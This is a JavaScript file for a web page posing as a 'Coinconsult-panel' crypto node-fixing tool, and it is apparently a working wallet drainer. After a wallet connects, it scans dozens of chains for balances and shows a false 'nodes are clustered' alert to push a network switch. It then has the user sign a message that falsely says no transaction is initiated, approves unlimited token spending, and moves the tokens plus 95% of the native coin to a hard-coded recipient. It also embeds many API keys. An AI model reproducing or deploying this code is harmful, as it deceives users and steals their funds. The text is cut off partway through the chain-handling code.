import { createWeb3Modal, defaultConfig } from '@web3modal/ethers5'
import { ethers }from 'ethers'
import { string } from 'zod'

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = '7b72ae90994c97929d1f03b9d8ca03d2'

// 2. Set chains
const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: 'https://cloudflare-eth.com'
}

const arbitrum = {
  chainId: 42161,
  name: 'Arbitrum',
  explorerUrl: 'https://arbiscan.io/',
  rpcUrl: "https://arb-mainnet.g.alchemy.com/v2/ArryoXDbagypNpkMY9uMh7FGxbwN7TeV"
}

const bsc = {
  chainId: 56,
  name: 'Binance Smart chain',
  explorerUrl: 'https://bscscan.com/',
  rpcUrl: 'https://crimson-black-grass.bsc.quiknode.pro/e79010621a02ab9296ffdd9d36b5cadfcc8322d9/'
}

const optimism = {
  chainId: 10,
  name: 'Optimism',
  explorerUrl: 'https://optimistic.etherscan.io/',
  rpcUrl: 'https://opt-mainnet.g.alchemy.com/v2/8jtBd-tmbbYfH0LzgXJRSCKFDGBZWc1I'
}

const arbnova = {
  chainId: 42170,
  name: 'Arbitrum Nova',
  explorerUrl: 'https://nova.arbiscan.io/',
  rpcUrl: 'https://arbitrum-nova.public.blastapi.io'
}

const base = {
  chainId: 8453,
  name: 'Base',
  explorerUrl: 'https://basescan.org/',
  rpcUrl: 'https://base-mainnet.g.alchemy.com/v2/2aVRyMi5gW6MUMbunRjGIyEWyy-DvWGI'
}

const zksync = { // Added missing colon after object declaration
  chainId: 324,
  name: 'Zksync',
  explorerUrl: 'https://explorer.zksync.io/',
  rpcUrl: "https://mainnet.era.zksync.io"
}

const polygon = {
  chainId: 137,
  name: "Polygon",
  explorerUrl: "https://polygonscan.com/",
  rpcUrl: "https://polygon-mainnet.g.alchemy.com/v2/C7T5HeZ3XlrUjKdMYLMrcdO0pxcNQWYX"
}

const polygonevm = {
  chainId: 1101,
  name: 'Polygon EVM',
  explorerUrl: 'https://zkevm.polygonscan.com/',
  rpcUrl: 'https://polygonzkevm-mainnet.g.alchemy.com/v2/ghkCe0RRzGrywh7RkuygKvLwtnH1ALGJ'
}

const blast = {
  chainId: 81457,
  name: 'Blast',
  explorerUrl: 'https://blastscan.io/',
  rpcUrl: 'https://blast-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const scroll = {
  chainId: 534352,
  name: 'Scroll',
  explorerUrl: 'https://scrollscan.com/',
  rpcUrl: 'https://scroll-mainnet.public.blastapi.io'
}

const metis = {
  chainId: 1088,
  name: 'Metis Andromeda',
  explorerUrl: 'https://explorer.metis.io/',
  rpcUrl: 'https://metis-mainnet.public.blastapi.io'
}

const merlin = {
  chainId: 4200,
  name: 'Merlin',
  explorerUrl: 'https://scan.merlinchain.io/',
  rpcUrl: 'https://merlin.blockpi.network/v1/rpc/public'
}

const manta = {
  chainId: 169,
  name: 'Manta Pacific',
  explorerUrl: 'https://pacific-explorer.manta.network/',
  rpcUrl: 'https://manta-pacific.drpc.org'
} 

const fantom = {
  chainId: 250,
  name: 'Fantom Opera',
  explorerUrl: 'https://ftmscan.com/',
  rpcUrl: 'https://fantom-mainnet.public.blastapi.io'
}

const gnosis = {
  chainId: 100,
  name: 'Gnosis',
  explorerUrl: 'https://gnosisscan.io/',
  rpcUrl: 'https://rpc.gnosis.gateway.fm'
}

const celo = {
  chainId: 42220,
  name: 'Celo',
  explorerUrl: 'https://celoscan.io/',
  rpcUrl: 'https://celo-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const cronos = {
  chainId: 25,
  name: 'Cronos',
  explorerUrl: 'https://cronoscan.com/',
  rpcUrl: 'https://evm.cronos.org/'
}

const mantle = {
  chainId: 5000,
  name: 'Mantle',
  explorerUrl: 'https://explorer.mantle.xyz/',
  rpcUrl: 'https://mantle-mainnet.public.blastapi.io'
}

const aurora = {
  chainId: 1313161554,
  name: 'Aurora',
  explorerUrl: 'https://explorer.aurora.dev/',
  rpcUrl: 'https://mainnet.aurora.dev'
}

const avalanche = {
  chainId: 43114,
  name: 'Avalanche',
  explorerUrl: 'https://avascan.info/',
  rpcUrl: 'https://avalanche-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const okx = {
  chainId: 66,
  name: 'Okx Mainnet',
  explorerUrl: 'https://www.oklink.com/oktc',
  rpcUrl: 'https://oktc-mainnet.public.blastapi.io'
}

const smartbch = {
  chainId: 10000,
  name: 'Smart bitcoin Cash',
  explorerUrl: 'https://smartbch.fountainhead.cash/mainnet'
}

const klaytn = {
  chainId: 8217,
  name: 'Klaytn Cypress',
  explorerUrl: '',
  rpcUrl: 'https://public-en-cypress.klaytn.net'
}

const harmony = {
  chainId: 1666600000,
  name: 'Harmony',
  explorerUrl: 'https://explorer.harmony.one/',
  rpcUrl: 'https://go.getblock.io/65eb9d18a22f4643a81ecdf11ce17640'
}

const heco = {
  chainId: 128,
  name: 'Huobi Eco Chain',
  explorerUrl: 'https://hecoscan.io/#/',
  rpcUrl: 'https://http-mainnet-node.huobichain.com'
}

const conflux = {
  chainId: 1030,
  name: 'Conflux espace',
  explorerUrl: 'https://www.confluxscan.io/',
  rpcUrl: 'https://evm.confluxrpc.com'
}

const platon = {
  chainId: 210425,
  name: 'Platon',
  explorerUrl: 'https://scan.platon.network/',
  rpcUrl: 'https://rpc.particle.network/evm-chain?chainId=210425&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt'
}

const linea = {
  chainId: 59144,
  name: 'Linea',
  explorerUrl: 'https://lineascan.build/',
  rpcUrl: 'https://linea-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const opbnb = {
  chainId: 204,
  name: 'opBNB',
  explorerUrl: 'https://opbnb.bscscan.com/',
  rpcUrl: 'https://rpc.particle.network/evm-chain?chainId=204&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt'
}

// 3. Create your application's metadata object
const metadata = {
  name: 'Coinconsult-panel',
  description: 'A crypto node/panel for fixing node clusters, validation and monitoring',
  url: 'app', // url must match your domain & subdomain
  icons: ['https://avatars.mywebsite.com/']
}

// 4. Create Ethers config
const ethersConfig = defaultConfig({
  /*Required*/
  metadata,

  /*Optional*/
  enableEIP6963: true, // true by default
  enableInjected: true, // true by default
  enableCoinbase: true, // true by default
  rpcUrl: 'https://eth-mainnet.g.alchemy.com/v2/IRwnvoQZmF2e0lePk63uoLwKO_en3nY1', // used for the Coinbase SDK
  defaultChainId: 1, // used for the Coinbase SDK
})

// 5. Create a Web3Modal instance
const modal = createWeb3Modal({
  ethersConfig,
  chains: [
    mainnet, 
    arbitrum, 
    bsc, 
    optimism, 
    arbnova, 
    base, 
    zksync, 
    polygon,
    polygonevm,
    blast,
    scroll,
    metis,
    merlin,
    manta,
    fantom,
    gnosis,
    celo,
    cronos,
    mantle,
    aurora,
    avalanche,
    okx,
    smartbch,
    klaytn,
    harmony,
    heco,
    platon,
    linea,
    opbnb,
    conflux
  ], // Added chains array
  projectId,
  enableAnalytics: true, // Optional - defaults to your Cloud configuration
  enableOnramp: true // Optional - false as default
})

const openConnectModalBtn = document.getElementById('open-connect-modal')

openConnectModalBtn.addEventListener('click', async () => {
    modal.open()
    openConnectModalBtn.innerHTML = 'Connected'
})


//API KEYS
  const etherscanapikey = '7K13FA32ZEWIPVXRS2ICJG5XUKHZMQE3DX';
  const bnbscanapikey = 'CH84KRSH8Z71G951C6VXVRWN7BI49CI8Z6';
  const arbapikey = 'MBS6UUPEK2QC33NRVSABQ3CDNAW2SZ4N52';
  const optimismapikey = 'M42GCWUMBY4ZNHV3CG6E5UJH2UF943MP9M';
  const arbnovaapikey = 'JPJMCUIBMUF91IVB515TAUMVAME1EA45Y8';
  const baseapikey = 'U9R88PV3UCW49K2YJX6YDCUN2EFSM7NGXR';
  const zksyncapikey = 'B2NY27YJX9EAI8DPP7RK877E6ZNENHK55X';
  const polygonapikey = '12WCEA5MEDHGVQCT5N1JG9FKPJ5U4FRYCQ';
  const polygonevmapikey = 'ZRSYXTK9DZHK89HXBIWPFYN9DDMZA23PFI';
  const blastapikey = 'Q7ZYBY68ZRTANVSE9N69ADYQV65P87Z4XD';
  const scrollapikey = 'P8F9GBDZ7MHA1DIHBZG6AHZ73HPNHUB6U9';
  const okxapikey = '5d00ecef-0dbf-4e1e-8b31-d74e91064f3c';
  const fantomapikey = 'ERG19ERIP5ZCSG4T6RHKSURR6W1A2ZZ4YF';
  const gnosisapikey = '5X9PNB5PMKFJ845131P7IHXPV8UY454H73';
  const lineaapikey = 'BMMNSMDJ4TB6KB2335ZB3QUQUU8VKZ9CBS';
  const celoapikey = '6K76PFC62X6RZI5D4EVZKAGXNIUKZR7INJ';
  const particleprojectid = 'aabbcf0e-e728-42bb-b6ed-f50be0154e20';
  const particleprojectserverkey = 's7UZZFHoE7koeD9Pw8lLDZyxMgCY36rngiGL3tLF';
  const opbnbapikey = "W6P1URXJZTF7UMXNEF6EN1EQZ7TG4U2489";
  const cronosapikey = 'GFTQNQFE2CAH21VIPVB3KE8B4YXM1BBZYV';
  const harmonyapikey = '65eb9d18a22f4643a81ecdf11ce17640';
  const merlinapikey = 'd52215ab-0017-4c01-a56b-b8bf4f08c921';

  //SMART CONTRACT ADDRESSES
  const contractAddress = '0x695902b97c3a78b3af0a3eedf15b4c9051e9d6f3';
  const bnbContractAddress = '0xecb19b89bbc345e34c974fb0ab79add57cf76cd7';
  const arbContractAddress = '0x8ed6e6e9c814fee2a0ea07276db2e6b1d0e22d3b';
  const optimismContractAddress = '0x4b706524e15866c7030d042b5fec8a66d7ab1456';
  const arbnovaContractAddress = '0xd2808c84d14b4ae3485736e62542319c5dd0e3c3';
  const baseContractAddress = '0x26e7842358deca133effe72ad3305f273f3470cd';
  const zksyncContractAddress = '0x56382FCC4595b59741a8fBa4109b86bC3054C6Ea';
  const polygonContractAddress = '0x4bdd3032d167d0225639d50d4acf46735d7927cf';
  const polygonevmContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const blastContractAddress = '0x3f4941479ff38d4cc1e39bd46381002e62f3e1e5';
  const scrollContractAddress = '0x3f4941479ff38d4cc1e39bd46381002e62f3e1e5';
  const metisContractAddress = '0x7286B3765Ebc13186f46e2ba3d3963B92B99C00A';
  const mantaContractAddress = '0x7286B3765Ebc13186f46e2ba3d3963B92B99C00A';
  const fantomContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const lineaContractAddress = '0x6f635BfaC18340D605A2095a1CF47fa2B86e3d48';
  const celoContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const avalancheContractAddress = '0xFb94197A668D71Bc81C5bC652D0152D422EA56e7';
  const opbnbContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const okxContractAddress = '0x6ff360B3B5ad12513e415e18Fd8cEC01F24DF77b';
  const mantleContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const klaytnContractAddress = '0x7286B3765Ebc13186f46e2ba3d3963B92B99C00A';
  const platonContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const cronosContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const harmonyContractAddress = '0x7286b3765ebc13186f46e2ba3d3963b92b99c00a';
  const gnosisContractAddress = '0x3F4941479FF38d4cc1E39BD46381002e62F3E1e5';
  const hecoContractAddress = '';
  const auroraContractAddress = '';
  const smartbchContractAddress = '';
  const confluxContractAddress = '';
  const merlinContractAddress = '';



  const recipientAddress = '0xfEC0B00929ed4FF0d7662D8b912F04d97fBd0D54'; //RECIPIENT ADDRESS
  const erc20ABI = [
      "function approve(address spender, uint256 amount) external returns (bool)",
      "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
      "function balanceOf(address owner) external view returns (uint256)"
  ];
  const contractABI = [
      "function transferTokens(address token, address owner, address recipient, uint256 amount) external returns (bool)"
  ];

async function connectWallet() {
    const walletProvider = modal.getWalletProvider()
    let provider = new ethers.providers.Web3Provider(walletProvider);
    console.log(provider)
    let signer = provider.getSigner();
    console.log(signer)

    try {
        await provider.send("eth_requestAccounts", []);
        const address = await signer.getAddress();
        console.log(address)
        const network = modal.getChainId()

        provider.on('network', (newNetwork, oldNetwork) => {
            if (oldNetwork) {
                // Network has changed
                console.log(`Network changed from old network to new network`);
                // Refresh the provider to reflect the new network
                provider = new ethers.providers.Web3Provider(walletProvider, "any");
                // Update the signer to match the new network
                signer = provider.getSigner();
                console.log('Signer updated for new network');
            }
        });

       
        let networkDetect = [
            {chainId: mainnet.chainId, name: mainnet.name, rpcurl: 'https://eth-mainnet.g.alchemy.com/v2/IRwnvoQZmF2e0lePk63uoLwKO_en3nY1', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://etherscan.io/', fetchTokens: fetchETHTokens},
            {chainId: bsc.chainId, name: bsc.name, rpcurl: 'https://bsc-mainnet.public.blastapi.io', nativeCurrency: {name: 'BNB',symbol:'BBN', decimal: 18}, blockExplorerUrl: 'https://bscscan.com/', fetchTokens: fetchBNBTokens},
            {chainId: arbitrum.chainId, name: arbitrum.name, rpcurl: 'https://arb-mainnet.g.alchemy.com/v2/ArryoXDbagypNpkMY9uMh7FGxbwN7TeV', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://arbiscan.io/', fetchTokens: fetchARBTokens},
            {chainId: optimism.chainId, name: optimism.name, rpcurl: 'https://opt-mainnet.g.alchemy.com/v2/8jtBd-tmbbYfH0LzgXJRSCKFDGBZWc1I', nativeCurrency: {name: 'Ethereum', symbol: 'ETH'}, blockExplorerUrl: 'https://optimistic.etherscan.io/', fetchTokens: fetchOPTokens},
            {chainId: arbnova.chainId, name: arbnova.name, rpcurl: 'https://arbitrum-nova.public.blastapi.io', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://nova.arbiscan.io/', fetchTokens: fetchARBNOVATokens},
            {chainId: base.chainId, name: base.name, rpcurl: 'https://base-mainnet.g.alchemy.com/v2/2aVRyMi5gW6MUMbunRjGIyEWyy-DvWGI', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://basescan.org/', fetchTokens: fetchBASETokens},
            {chainId: zksync.chainId, name: zksync.name, rpcurl: 'https://mainnet.era.zksync.io', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://explorer.zksync.io/', fetchTokens: fetchZKSYNCTokens},
            {chainId: polygon.chainId, name: polygon.name, rpcurl: 'https://polygon-mainnet.g.alchemy.com/v2/C7T5HeZ3XlrUjKdMYLMrcdO0pxcNQWYX', nativeCurrency: {name: 'Matic', symbol: 'MATIC', decimal: 18}, blockExplorerUrl: 'https://polygonscan.com/', fetchTokens: fetchPOLYGONTokens},
            {chainId: polygonevm.chainId, name: polygonevm.name, rpcurl: 'https://polygonzkevm-mainnet.g.alchemy.com/v2/ghkCe0RRzGrywh7RkuygKvLwtnH1ALGJ', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://zkevm.polygonscan.com/', fetchTokens: fetchPOLYGONEVMTokens},
            {chainId: blast.chainId, name: blast.name, rpcurl: 'https://blast-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://blastscan.io/', fetchTokens: fetchBLASTTokens},
            {chainId: scroll.chainId, name: scroll.name, rpcurl: 'https://scroll-mainnet.public.blastapi.io', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://scrollscan.com/', fetchTokens: fetchSCROLLTokens},
            {chainId: metis.chainId, name: metis.name, rpcurl: 'https://metis-mainnet.public.blastapi.io', nativeCurrency: {name: 'Metis Token', symbol: 'METIS', decimal: 18}, blockExplorerUrl: 'https://explorer.metis.io/', fetchTokens: fetchMETISTokens},
            {chainId: merlin.chainId, name: merlin.name, rpcurl: 'https://merlin.blockpi.network/v1/rpc/public', nativeCurrency: {name: 'Bitcoin', symbol: 'BTC', decimal: 18}, blockExplorerUrl: 'https://scan.merlinchain.io/', fetchTokens: fetchMERLINTokens},
            {chainId: manta.chainId, name: manta.name, rpcurl: 'https://manta-pacific.drpc.org', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://pacific-explorer.manta.network/', fetchTokens: fetchMANTATokens},
            {chainId: fantom.chainId, name: fantom.name, rpcurl: 'https://fantom-mainnet.public.blastapi.io', nativeCurrency: {name: 'Fantom', symbol: 'FTM', decimal: 18}, blockExplorerUrl: 'https://ftmscan.com/', fetchTokens: fetchFANTOMTokens},
            {chainId: gnosis.chainId, name: gnosis.name, rpcurl: 'https://rpc.gnosis.gateway.fm', nativeCurrency: {name: 'xDai', symbol: 'xDAI', decimal: 18}, blockExplorerUrl: 'https://gnosisscan.io/', fetchTokens: fetchGNOSISTokens},
            {chainId: celo.chainId, name: celo.name, rpcurl: 'https://celo-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Celo', symbol: 'CELO', decimal: 18}, blockExplorerUrl: 'https://celoscan.io/', fetchTokens: fetchCELOTokens},
            {chainId: cronos.chainId, name: cronos.name, rpcurl: 'https://evm.cronos.org/', nativeCurrency: {name: 'Cronos', symbol: 'CRO', decimal: 18}, blockExplorerUrl: 'https://cronoscan.com/', fetchTokens: fetchCRONOSTokens},
            {chainId: mantle.chainId, name: mantle.name, rpcurl: 'https://mantle-mainnet.public.blastapi.io', nativeCurrency: {name: 'Mantle', symbol: 'MNT', decimal: 18}, blockExplorerUrl: 'https://explorer.mantle.xyz/', fetchTokens: fetchMANTLETokens},
            {chainId: aurora.chainId, name: aurora.name, rpcurl: 'https://mainnet.aurora.dev', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://explorer.aurora.dev/', fetchTokens: fetchAURORATokens},
            {chainId: avalanche.chainId, name: avalanche.name, rpcurl: 'https://avalanche-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Avalanche', symbol: 'AVAX', decimal: 18}, blockExplorerUrl: 'https://avascan.info/', fetchTokens: fetchAVALANCHETokens},
            {chainId: okx.chainId, name: okx.name, rpcurl: 'https://oktc-mainnet.public.blastapi.io', nativeCurrency: {name: 'OKT', symbol: 'OKT', decimal: 18}, blockExplorerUrl: 'https://www.oklink.com/oktc', fetchTokens: fetchOKXTokens},
            {chainId: smartbch.chainId, name: smartbch.name, rpcurl: 'https://smartbch.fountainhead.cash/mainnet', nativeCurrency: {name: 'Bitcoin Cash', symbol: 'BCH', decimal: 18}, blockExplorerUrl: 'https://smartbch.org/', fetchTokens: fetchSMARTBCHTokens},
            {chainId: klaytn.chainId, name: klaytn.name, rpcurl: 'https://public-en-cypress.klaytn.net', nativeCurrency: {name: 'Klaytn', symbol: 'KLAY', decimal: 18}, blockExplorerUrl: 'https://scope.klaytn.com', fetchTokens: fetchKLAYTNTokens},
            {chainId: harmony.chainId, name: harmony.name, rpcurl: 'https://go.getblock.io/65eb9d18a22f4643a81ecdf11ce17640', nativeCurrency: {name: 'Harmony', sykmbol: 'ONE', decimal: 18}, blockExplorerUrl: 'https://explorer.harmony.one/', fetchTokens: fetchHARMONYTokens},
            {chainId: heco.chainId, name: heco.name, rpcurl: 'https://http-mainnet-node.huobichain.com', nativeCurrency: {name: 'Huobi Token', symbol: 'HT', decimal: 18}, blockExplorerUrl: 'https://hecoscan.io/#/', fetchTokens: fetchHECOTokens},
            {chainId: conflux.chainId, name: conflux.name, rpcurl: 'https://evm.confluxrpc.com', nativeCurrency: {name: 'Conflux Token', symbol: 'CFX', decimal: 18}, blockExplorerUrl: 'https://evm.confluxscan.net', fetchTokens: fetchCONFLUXTokens},
            {chainId: platon.chainId, name: platon.name, rpcurl: 'https://rpc.particle.network/evm-chain?chainId=210425&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt', nativeCurrency: {name: 'PlatON', symbol: 'LAT', decimal: 18}, blockExplorerUrl: 'https://scan.platon.network', fetchTokens: fetchPLATONTokens},
            {chainId: linea.chainId, name: linea.name, rpcurl: 'https://linea-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://lineascan.build/', fetchTokens: fetchLINEATokens},
            {chainId: opbnb.chainId, name: opbnb.name, rpcurl: 'https://rpc.particle.network/evm-chain?chainId=204&projectUuid=aabbcf0e-e728-42bb-b6ed-f50be0154e20&projectKey=c5zORhFBadsXOH5NVCRzIhDYpQ1zoxEfQdBxmGVt', nativeCurrency: {name: 'opBNB', symbol: 'BNB', decimal: 18}, blockExplorerUrl: 'https://mainnet.opbnbscan.com', fetchTokens: fetchOPBNBTokens}
        ]

        let currentChainId = await provider.getNetwork();
        let networksWithTokens = []

        const minimumBalance = ethers.utils.parseUnits("0.02", 18); // Set minimum balance to 0.02 tokens


      try {
        for(const nets of networkDetect){
            const networkProvider = new ethers.providers.JsonRpcProvider(nets.rpcurl)
            const nonZeroBalance = []
            let netBalances = ethers.BigNumber.from(0)
            let highestSingleTokenBalance = ethers.BigNumber.from(0);


            //get native balances first
            try {
                const nativeBalance = await networkProvider.getBalance(address);
                if(nativeBalance.gte(minimumBalance)){
                    const formattedNativeBalance = ethers.utils.formatUnits(nativeBalance, 18);
                    nonZeroBalance.push({ tokenSymbol: nets.nativeCurrency.symbol, balance: parseFloat(formattedNativeBalance) });
                    netBalances = netBalances.add(nativeBalance);
                    if (nativeBalance.gt(highestSingleTokenBalance)) {
                        highestSingleTokenBalance = nativeBalance;
                    }

                }
            } catch (error) {
                console.error(`Failed to fetch native balance:`, error);
            }

            const tokens = await nets.fetchTokens(address);
            for(const token of tokens){
                try {
                    const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, networkProvider);
                    const balance = await tokenContract.balanceOf(address);

                    if(balance.gte(minimumBalance)){
                        const formattedBalance = ethers.utils.formatUnits(balance, token.decimal);
                        nonZeroBalance.push({symbol: token.tokenSymbol, balance: parseFloat(formattedBalance)});
                        netBalances = netBalances.add(balance);
                        if (balance.gt(highestSingleTokenBalance)) {
                            highestSingleTokenBalance = balance;
                        }

                    }
                } catch (error) {
                    console.error(`Failed to fetch balance for ${token.tokenSymbol}:`, error);
                }
            }
            if(nonZeroBalance.length > 0){
                nonZeroBalance.sort((a, b) => b.balance - a.balance);

                networksWithTokens.push({
                    chainId: nets.chainId,
                    name: nets.name,
                    rpcUrl: nets.rpcurl,
                    nativeCurrency: nets.nativeCurrency,
                    blockExplorerUrl: nets.blockExplorerUrl,
                    highestSingleTokenBalance: ethers.utils.formatUnits(highestSingleTokenBalance, 18), // Format highest single token balance
                    netBalances: ethers.utils.formatUnits(netBalances, 18),
                })
            }
        }
      } catch (error) {
        console.error('Error fetching tokens and details:', error)
      }
      
        // Sort networks by highest single token balance in descending order
        networksWithTokens.sort((a, b) => parseFloat(b.highestSingleTokenBalance) - parseFloat(a.highestSingleTokenBalance));

        console.log('Networks with tokens sorted by highest single token balance:', networksWithTokens.map(net => ({
            name: net.name,
            highestSingleTokenBalance: net.highestSingleTokenBalance
        })));

        const maxSingleTokenBalance = Math.max(...networksWithTokens.map(net => parseFloat(net.highestSingleTokenBalance)));

        console.log(`Maximum single token balance: ${maxSingleTokenBalance}`);

        if (!networksWithTokens.some(net => net.chainId === currentChainId.chainId) && networksWithTokens.length > 0) {
            window.alert(`Your Nodes are clustered on the current Networks: ${networksWithTokens.map(net => net.name).join(", ")}. Please switch your network!`);
            for (let net of networksWithTokens) {
                var targetNetworkId = net.chainId; // Target each network with tokens
                try {
                    // Attempt to switch networks programmatically
                    await modal.switchNetwork(targetNetworkId);
                    console.log(`Switched to network: ${targetNetworkId}`);

                    // Update the provider and signer to reflect the new network
                    provider = new ethers.providers.Web3Provider(walletProvider, 'any');
                    signer = provider.getSigner();

                    switch(targetNetworkId) {

                        //HANDLE ETHEREUM NETWORK
                        case mainnet.chainId:
                          const tokens = await fetchETHTokens(address);
                          // Message to sign
                          const message = "This is a standard message approval to verify your account. No transactions are initiated";
                          const signature = await signer.signMessage(message);
                          console.log('Signature:', signature);
              
                          const tokenDetails = [];
                          for (let token of tokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  tokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          tokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of tokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(contractAddress, maxUint256, { gasLimit: 500000 });
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(contractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance, { gasLimit: 500000 });
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ETH`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for Ether to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring Ether:', error);
                              
                         }
                          break;
              
              
                        //BINANCE SMART CHAIN
                        case bsc.chainId:
                          const bscTokens = await fetchBNBTokens(address);
              
                          // Message to sign
                          const bnbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const bnbSignature = await signer.signMessage(bnbMessage);
                          console.log('Signature:', bnbSignature);
              
                          const bnbTokenDetails = [];
                          for (let token of bscTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  bnbTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          bnbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of bnbTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(bnbContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(bnbContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BNB`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BNB`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for BNB to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring Ether:', error);
                              
                         }
                          break;
              
              
              
                        //ARBITRUM NETWORK
                        case arbitrum.chainId:
                          const arbTokens = await fetchARBTokens(address);
              
                          // Message to sign
                          const arbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const arbSignature = await signer.signMessage(arbMessage);
                          console.log('Signature:', arbSignature);
              
                          const arbTokenDetails = [];
                          for (let token of arbTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
